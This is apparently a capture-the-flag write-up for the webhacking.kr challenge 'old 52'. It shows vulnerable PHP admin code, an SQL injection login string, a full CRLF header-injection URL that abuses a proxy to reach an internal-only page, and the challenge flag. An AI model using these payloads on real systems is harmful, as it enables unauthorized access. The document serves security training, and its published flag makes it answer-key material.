# Old 52    SQLi + SSRF

URLs: 
- Challenge: [http://webhacking.kr:10008](http://webhacking.kr:10008)
- Proxy: [http://webhacking.kr:10008/proxy.php](http://webhacking.kr:10008/proxy.php)
- Admin: [http://webhacking.kr:10008/admin/](http://webhacking.kr:10008/admin/)
	- Source: [http://webhacking.kr:10008/admin/?view_source=1](http://webhacking.kr:10008/admin/?view_source=1)

![old-52.png](/assets/ctf/webhacking.kr/old-52.png)

`/admin` asks for credentials. `guest:guest` can be used for auth.

![old-52-1.png](/assets/ctf/webhacking.kr/old-52-1.png)

![old-52-3.png](/assets/ctf/webhacking.kr/old-52-3.png)

Source:
```php
<?php
include "config.php";
if ($_GET["view_source"]) { view_source(); }
if ($_GET["logout"] == 1) { $_SESSION["login"] = ""; exit("<script>location.href='./';</script>"); }
if ($_SESSION["login"]) {
    echo "hi {$_SESSION["login"]}<br>";
    if ($_SESSION["login"] == "admin") {
        if (preg_match("/^172\.17\.0\./", $_SERVER["REMOTE_ADDR"])) { echo $flag; } 
        else { echo "Only access from virtual IP address"; }
    } else {
        echo "You are not admin";
    }
    echo "<br><a href=./?logout=1>[logout]</a>";
    exit();
}
if (!$_SESSION["login"]) {
    if (preg_match("/logout=1/", $_SERVER["HTTP_REFERER"])) {
        header('WWW-Authenticate: Basic realm="Protected Area"');
        header("HTTP/1.0 401 Unauthorized");
    }
    if ($_SERVER["PHP_AUTH_USER"]) {
        $id = $_SERVER["PHP_AUTH_USER"];
        $pw = $_SERVER["PHP_AUTH_PW"];
        $pw = md5($pw);
        $db = dbconnect();
        $query = "select id from member where id='{$id}' and pw='{$pw}'";
        $result = mysqli_fetch_array(mysqli_query($db, $query));
        if ($result["id"]) {
            $_SESSION["login"] = $result["id"];
            exit("<script>location.href='./';</script>");
        }
    }
    if (!$_SESSION["login"]) {
        header('WWW-Authenticate: Basic realm="Protected Area"');
        header("HTTP/1.0 401 Unauthorized");
        echo "Login Fail";
    }
}
?><hr><a href=./?view_source=1>view-source</a>
```

Proxy is a bit friendlier: [http://webhacking.kr:10008/proxy.php?page=/admin/](http://webhacking.kr:10008/proxy.php?page=/admin/)

![old-52-2.png](/assets/ctf/webhacking.kr/old-52-2.png)

First we need to become admin, and since there's no validation on SQL query it's easily by passable like `admin' #:uwu` (`username:password` format)

But we can't access the flag, because only internal services can. That's where the Proxy comes in. We are allowed to specify the path, but it's also not sanitized so we are able to inject new headers.

Start cooking in CyberChef, [Recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cn'%7D,'%5C%5Cr%5C%5Cn',true,false,true,false)URL_Encode(false)&input=L2FkbWluLyBIVFRQLzEuMQpBdXRob3JpemF0aW9uOiBCYXNpYyBZV1J0YVc0bklDTTZkWGQxCkNvb2tpZTogUEhQU0VTU0lEPWhpNHV2YWk1c2RlOTBlbmNyMGt0cTY4NzlmClVzZXItQWdlbnQ6) should look like this:

![old-52-5.png](/assets/ctf/webhacking.kr/old-52-5.png)

[http://webhacking.kr:10008/proxy.php?page=/admin/%20HTTP/1.1%0D%0AAuthorization:%20Basic%20YWRtaW4nICM6dXd1%0D%0ACookie:%20PHPSESSID=hi4uvai5sde90encr0ktq6879f%0D%0AUser-Agent:](http://webhacking.kr:10008/proxy.php?page=/admin/%20HTTP/1.1%0D%0AAuthorization:%20Basic%20YWRtaW4nICM6dXd1%0D%0ACookie:%20PHPSESSID=hi4uvai5sde90encr0ktq6879f%0D%0AUser-Agent:)

![old-52-4.png](/assets/ctf/webhacking.kr/old-52-4.png)

::: tip Flag
`FLAG{Server_Side_Request_Forgery_with_proxy!}`
:::

